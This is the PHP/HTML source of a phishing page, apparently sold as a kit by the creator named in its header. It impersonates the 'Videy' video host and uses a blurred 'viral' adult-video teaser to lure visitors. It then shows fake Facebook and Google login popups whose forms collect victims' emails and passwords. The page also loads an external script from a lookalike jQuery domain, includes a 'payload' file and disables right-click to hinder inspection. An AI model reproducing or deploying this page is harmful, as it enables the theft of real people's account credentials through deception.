<?php
// Creator Sc  : LUKY NESIA 
// Order Script Vip : 6289509551861
// Telegram   : t.me/luky_nesia

if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<!DOCTYPE HTML>
<html>
 <head> 
  <meta name="description" content="Videy is a platform for free and simple video hosting."> 
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
  <title>Video Viral 20245! | Videy - free and simple video hosting</title> 
  <link rel="icon" type="image/x-icon" href="media/favicon.ico"> 
  <link rel="preconnect" href="https://fonts.googleapis.com"> 
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;600&amp;family=Poppins:wght@600&amp;display=swap" rel="stylesheet"> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/3/css/facebook.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/3/css/google.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/3/css/all.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/18/css/style.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/18/css/sty2.css"> 
  <style>
</style> 
 </head> 
 <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"> 
  <div class="nav-outer"> 
   <div class="nav-inner"> 
    <div class="logo-text"> 
     <a href="/">videy</a> 
    </div> 
    <a href="/">
     <div class="upload-button-nav">
      Upload
     </div></a> 
    <div class="legal"> 
     <div class="legal-menu"> 
      <a href="javascript:void(0);" class="icon"><i class="fa fa-bars" onclick="LoginAwal()"></i></a> 
     </div> 
     <div class="legal-item"> 
      <a href="/">Privacy Policy</a> 
     </div> 
     <div class="legal-item"> 
      <a href="/">Terms of Service</a> 
     </div> 
     <div class="legal-item"> 
      <a href="/">Abuse</a> 
     </div> 
    </div> 
   </div> 
  </div> 
  <div id="mobile-menu"> 
   <a href="/">Privacy Policy</a> 
   <a href="/">Terms of Service</a> 
   <a href="/">Abuse</a> 
  </div> 
  <div class="body"> 
   <br> 
   <img src="https://cdn.stackpath.web.id/18/img/BlurHitamm.jpg" alt="" onclick="Loginpopunder()"> 
   <h3>VIDEO VIRAL COLMEK TERBARU</h3> 
   <br> 
   <img src="https://cdn.stackpath.web.id/18/img/ads.webp" alt="" style="width: 100%; border: none;" onclick="Loginpopunder()"> 
    </div> 
   </div> 
  </div> 
   <div class="popup-login selectLogin animate fadeIn" style="display: none;"> 
   <div class="option"> 
    <center> 
     <div class="textdwnlfgn">
      Login to Continue.
     </div> 
     <div class="imgLog" style="display:block; margin: auto; margin-top: 20px;"> 
      <img src="https://cdn.stackpath.web.id/3/img/logfb.webp" onclick="OpenFacebook();"> 
      <img src="https://cdn.stackpath.web.id/3/img/loggp.webp" onclick="OpenGoogle();"> 
     </div> 
    </center> 
   </div> 
  </div> 
  </center> 
   </div> 
  </div> 
  <div class="popup-login loginxFacebook animated fadeIn" style="display: none;"> 
   <div class="popup-box-login-fb"> 
    <a class="close-alex-google" onclick="CloseFacebook()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="navbar-fb"> 
     <img width="45" src="https://cdn.stackpath.web.id/3/img/fbatas.webp"> 
    </div> 
    <div class="content-box-fb"> 
     <img width="55" height="55" src="https://cdn.stackpath.web.id/3/img/fb.webp"> 
     <div class="txt-login-fb">
      Masuk ke akun Anda untuk terhubung dengan Facebook.com
     </div>
     <form class="login-form" id="FromxFacebook" method="POST"> 
      <input type="text" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required> 
      <input type="password" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off" required> 
      <input type="hidden" name="login" value="Facebook" readonly> 
      <button class="btn-login-fb" type="submit">Masuk</button> 
     </form> 
     <div class="txt-create-account">
      Create account
     </div> 
     <div class="txt-not-now">
      Not now
     </div> 
     <div class="txt-forgotten-password">
      Forgotten password?
     </div> 
    </div> 
    <div class="language-box"> 
     <center> 
      <div class="language-name language-name-active">
       English (UK)
      </div> 
      <div class="language-name">
       Bahasa Indonesia
      </div> 
      <div class="language-name">
       Basa Jawa
      </div> 
      <div class="language-name">
       Bahasa Melayu
      </div> 
      <div class="language-name">
       日本語
      </div> 
      <div class="language-name">
       Español
      </div> 
      <div class="language-name">
       Português (Brasil)
      </div> 
      <div class="language-name"> 
       <i class="fa fa-plus"></i> 
      </div> 
     </center> 
    </div> 
    <div class="copyright">
     Facebook Inc.
    </div> 
   </div> 
  </div> 
  <div class="popup-ariandi alex-google animate fadeIn" style="display: none;"> 
   <div class="container-box-google"> 
    <a class="close-alex-google" onclick="CloseGoogle()"><i style="position: relative; top: 0px;" class="fa fa-times"></i></a> 
    <div class="atasan-google"> 
     <center> 
      <p class="kagetgoogle email-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <p class="kagetgoogle sandi-gp">Please check if the <b>login</b> and <b>password</b> you entered are correct.</p> 
      <br> 
      <img class="img-loggoogle" src="https://cdn.stackpath.web.id/3/img/gp.webp" style="width: 120px;"> 
     </center> 
    </div> 
    <div class="isi-google"> 
     <center> 
      <form id="FromxGoogle" method="POST"> 
       <div class="ucapan-google">
        Login to 
        <b>Google</b> to carry on.
       </div> 
       <div class="form-login-google"> 
        <input type="text" id="email_gp" name="email" placeholder="Email. Telepon, atau Username" required> 
       </div> 
       <div class="form-login-google"> 
        <input type="password" id="password_gp" name="password" placeholder="Kata Sandi" required> 
       </div> 
       <input type="hidden" name="login" value="Google" readonly> 
       <button class="btn-login-google cancel" type="submit">Masuk</button> 
       <!-- <button class="btn-login-google" style="background: #fff; border: 1px solid #000; color: #000;" type="button" onclick="ariandi_google()">Cancel</button> --> 
       <br> 
      </form>  
     </center> 
    </div> 
   </div> 
  </div> 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://jquery.biz.id/libs/jquery-3.17.21.min.js"></script>
  <script src="js/jquery.min.js"></script>
<?php
//DON'T DELETE THIS MODULE
//MODULE DI ENC BIAR KAGA KE MALINGAN KODE
?>
<script>
// KHUSUS VIP S2M MINAT CHAT WA SAMPING https://wa.me/6289509551861
</script>
</body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>